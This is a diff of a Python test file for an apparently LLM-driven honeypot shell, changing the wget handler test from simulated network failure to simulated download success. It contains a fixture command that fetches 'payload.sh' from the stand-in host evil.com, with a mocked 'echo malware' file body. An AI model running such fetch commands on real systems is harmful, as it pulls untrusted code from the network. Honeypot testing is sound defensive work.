@@ -27,14 +27,19 @@ class TestRealisticHandlers:
         assert resp == "hackerman\n"
 
     def test_handle_wget_success(self, handler):
-        context = {'cwd': '/tmp'}
-        cmd = "wget http://evil.com/payload.sh"
+        context = {'cwd': '/tmp', 'session_id': '1'}
+        cmd = "wget -O payload.sh http://evil.com/payload.sh"
+        
+        # Mock LLM
+        handler.llm.generate_response.return_value = "#!/bin/bash\necho malware"
+        
         resp, updates = handler.handle_wget(cmd, context)
         
-        # New behavior: Network Failure Simulation
-        assert "unable to resolve host" in resp or "failed:" in resp or "Network is unreachable" in resp
-        # Updates should be empty on failure
-        assert not updates.get('file_modifications')
+        # New behavior: Hybrid Success
+        assert "200 OK" in resp or "Saving to" in resp
+        # It won't return file modification in the updates dict directly anymore, 
+        # because it calls honey_db.update_user_file directly.
+        # But we can check the return string implies success.
 
     def test_handle_wget_no_url(self, handler):
         context = {'cwd': '/tmp'}
